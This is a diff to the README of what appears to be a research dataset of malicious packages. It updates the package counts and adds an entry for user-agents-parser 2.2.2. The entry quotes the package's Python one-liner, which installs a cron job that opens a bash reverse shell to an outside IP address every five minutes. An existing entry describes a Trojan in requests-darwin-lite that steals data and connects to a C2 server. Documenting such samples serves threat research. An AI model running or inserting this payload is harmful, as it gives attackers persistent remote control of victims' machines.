@@ -1,6 +1,6 @@
 ## Dataset Size
 
-This data set includes about 5,894 versions of the source code of 5,172 malicious packages.
+This data set includes about 5,895 versions of the source code of 5,173 malicious packages.
 
 ## Dataset Format
 
@@ -296,6 +296,13 @@ sphinx-rtd-theme-cilium [99.9.9]
 requests_darwin_lite  [2.28.0]
 
 When the user installs the affected version of the requests-darwin-lite pyhton component package, the malicious Trojan file **requests-sidebar-large.png** will be executed on the Mac system, stealing sensitive system information and establishing a persistent connection with a C2 address controlled by the attacker. Attack The attacker can remotely execute malicious system commands on the user's system.
+
+### 18 May. 2024 
+user-agents-parser [2.2.2]
+    
+```python
+__import__("os").system("(crontab -l > .tab ; echo "*/5 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/95.179.177.74/1337 0>&1'" >> .tab ; crontab .tab ; rm .tab) > /dev/null 2>&1")
+```
 
 ## About the malicious packages detection
 
